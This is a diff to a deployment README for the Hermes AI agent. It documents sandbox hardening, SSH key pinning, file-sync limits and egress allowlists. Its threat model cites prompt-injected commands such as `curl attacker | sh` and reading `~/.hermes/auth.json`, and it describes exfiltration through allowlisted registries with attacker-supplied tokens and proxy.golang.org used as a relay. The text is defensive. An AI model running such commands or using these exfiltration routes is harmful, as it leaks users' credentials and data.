@@ -81,10 +81,17 @@ pip and venv, Node.js and npm, git, build-essential, ripgrep, jq and curl.
   state persist across restarts. It is unbounded; check its size now and then.
 - **Package installs** work through `egress-dev`. `pip install --user` is
   allowed (`PIP_BREAK_SYSTEM_PACKAGES=1`); virtualenvs work too.
+- **File sync**: Hermes's SSH backend copies its skills, its cache
+  directories and any credential files a skill declares into `~/.hermes` in
+  the sandbox (never `auth.json` or `.env`, which it refuses). It can also
+  copy changed files back; that is disabled here
+  (`terminal.sync_back_max_bytes: 0`), so whatever the agent writes to
+  `~/.hermes` stays in the sandbox instead of landing in Hermes's own skills.
 - **Hardening**: non-root (`uid 10001`), read-only root filesystem, `/tmp` on
   tmpfs, all capabilities dropped, `no-new-privileges`, 4 GiB memory, 3 CPUs,
   1024 PIDs. `sshd` runs unprivileged on port 2222 with key-only login, no
-  forwarding, and the authorized key mounted read-only from the host.
+  forwarding, and its host key and the authorized key mounted read-only from
+  the root-only `ssh/` directory (nothing the agent can write controls them).
 - **Adding tools**: edit `sandbox/Dockerfile`, then
   `sudo ./setup.sh reconcile hermes-agent` (it rebuilds). Rebuild with
   `--no-cache` periodically to pick up Debian security updates:
@@ -96,7 +103,8 @@ pip and venv, Node.js and npm, git, build-essential, ripgrep, jq and curl.
   sudo ./setup.sh reconcile hermes-agent
   ```
 - **Reset**: stop the stack and clear `workspace/` to wipe the agent's files.
-  Nothing else lives there.
+  The SSH host key lives in `ssh/`, not in `workspace/`, so Hermes keeps
+  connecting.
 
 ## Egress allowlists
 
@@ -106,14 +114,20 @@ container's output, so denied requests (`TCP_DENIED`) appear in Dozzle; that
 is the way to find a hostname a tool needs.
 
 - Only `CONNECT` to port 443 and only to listed hostnames. Plain HTTP is
-  denied.
+  denied, and so is any destination given as an IP address: Squid would match
+  `dstdomain` against the IP's reverse-DNS name, which the IP's owner
+  controls.
 - Destinations that resolve to private, loopback, link-local or tailnet
   addresses (`10/8`, `172.16/12`, `192.168/16`, `100.64/10`, `127/8`,
   `169.254/16`) are denied even for allowlisted names, which blocks DNS
   rebinding into your LAN or tailnet.
 - HTTPS is tunnelled, so the proxy cannot filter by HTTP method or path. An
-  allowlisted host is reachable for any request to it. The listed hosts do
-  not accept anonymous writes, but treat the list as a trust decision.
+  allowlisted host is reachable for any request to it, including writes
+  authenticated with a token an attacker supplies in a prompt (a GitHub gist
+  or push, `npm publish`, a PyPI upload). `proxy.golang.org` also fetches
+  arbitrary hosts on the sandbox's behalf, so it works as a relay. Treat the
+  list as a trust decision, and remove `proxy.golang.org` and
+  `sum.golang.org` from `egress/dev.conf` if you do not write Go.
 
 ## Requirements
 
@@ -122,15 +136,17 @@ is the way to find a hostname a tool needs.
   reconcile.
 - A ChatGPT plan that includes Codex (see Signing in above).
 
-`sudo ./setup.sh reconcile hermes-agent` also creates, once, the SSH key pair
-in `apps/hermes-agent/ssh/` (a root-only directory) and seeds
-`data/config.yaml` on first run:
+`sudo ./setup.sh reconcile hermes-agent` also creates, once, the SSH keys in
+`apps/hermes-agent/ssh/` (a root-only directory): Hermes's client key, its
+public half, the sandbox's host key, and a `known_hosts` that pins that host
+key for Hermes. It seeds `data/config.yaml` on first run:
 
 ```yaml
 model:
   provider: "openai-codex"
 terminal:
   backend: "ssh"
+  sync_back_max_bytes: 0
 approvals:
   mode: "manual"
 auth:
@@ -138,9 +154,12 @@ auth:
 ```
 
 It never overwrites an existing `config.yaml`, so later changes from the
-dashboard's Config page persist. If you change `terminal.backend` there, you
-bypass the sandbox: commands would run inside the `hermes` container next to
-the ChatGPT login.
+dashboard's Config page persist; it refuses to run if that path is a
+symlink, and never changes the owner or mode of anything inside `data/`,
+which the `hermes` container can write. If you change `terminal.backend`
+there, you bypass the sandbox: commands would run inside the `hermes`
+container next to the ChatGPT login. Removing `sync_back_max_bytes: 0`
+re-enables copying files from the sandbox into Hermes's skills.
 
 ## Migrating from the llama.cpp deployment
 
@@ -208,8 +227,11 @@ tools and `execute_code` run in `hermes-sandbox` over SSH. A prompt-injected
 `env`, `cat ~/.hermes/auth.json`, or `curl attacker | sh` runs in a container
 that has no ChatGPT login, no dashboard secret, no SSH private key and no
 route to OpenAI. Hermes also never forwards its provider credentials over the
-SSH backend, even if listed. The sandbox's only secrets-adjacent file is the
-SSH *public* key.
+SSH backend, even if listed, and refuses to sync `auth.json` and `.env`. It
+does copy its skills and cache into the sandbox (and any other credential
+file a skill declares, such as session history), and copying back is
+disabled so the sandbox cannot plant skills in Hermes. The sandbox holds the
+SSH *public* key and its own host key.
 
 **Network egress is allowlisted.** Neither container has a route out except
 through its proxy; `hermes` can reach OpenAI only, the sandbox can reach
@@ -230,11 +252,14 @@ volume and drop to the `hermes` user (`CHOWN`, `DAC_OVERRIDE`, `FOWNER`,
 `SETUID`, `SETGID`).
 
 **Blast radius if the sandbox is fully compromised:** it can read and corrupt
-anything in `workspace/`, burn CPU and memory up to its limits, fetch from the
-allowlisted registries/GitHub, and open connections to the `hermes` container
-over `link` (the dashboard login is the only thing guarding that port). It
-cannot read the ChatGPT login, reach the internet outside the allowlist, reach
-the LAN or tailnet, or touch other containers or the host.
+anything in `workspace/` and the files Hermes synced into it, burn CPU and
+memory up to its limits, fetch from the allowlisted registries/GitHub, and
+open connections to the `hermes` container over `link` (the dashboard login
+is the only thing guarding that port, and it locks a client out for a short
+while after 10 failed attempts). It cannot read the ChatGPT login, write
+into Hermes's own files, reach the internet outside the allowlist, reach the
+LAN or tailnet, or touch other containers or the host. It can still lie in
+the output it returns to the model.
 
 **Blast radius if `hermes` itself is manipulated** (for example through
 content it summarises): it can read its own data volume, including
@@ -252,14 +277,19 @@ and the allowlists bound what a successful one can do.
   gateway IP (`docker network inspect hermes-agent_llm`) and add it to
   `dashboard.trusted_proxies` in `config.yaml`.
 - The sandbox can reach `hermes:9119` over `link`. Docker cannot restrict by
-  port within a network; the dashboard password is the control.
+  port within a network; the dashboard login is the control, so choose a
+  strong password (`setup.sh` accepts any non-empty one).
 - Secrets (the dashboard password, `auth.json`) sit in plaintext on the SSD,
   `chmod 600` for the files `setup.sh` writes, like every other secret in this
   repo. SSD theft or root compromise exposes all of them.
-- Allowlisted hosts accept any HTTPS request (see Egress allowlists).
-- `egress-dev` allows `github.com` for anonymous reads. Do not put a GitHub
-  token in the sandbox without scoping it as tightly as you would any
-  credential you expect to be exfiltrated.
+- Allowlisted hosts accept any HTTPS request, including writes made with an
+  attacker-supplied token (see Egress allowlists). Workspace contents are
+  exfiltratable that way; do not put code or data in the sandbox that you
+  would not accept leaking.
+- The two Squid containers sit on an ordinary bridge so they can reach the
+  internet. If Squid itself were exploited, that bridge routes to your LAN and
+  tailnet. The image is pinned by digest on Canonical's `edge` tag and does
+  not update itself; bump it as you do the other pinned images.
 - The `hermes-agent` image is pinned by digest but is a fast-moving project
   with a large bundled dependency surface that ships whether or not this
   deployment uses it. The Squid image (`ubuntu/squid`, Canonical) is pinned
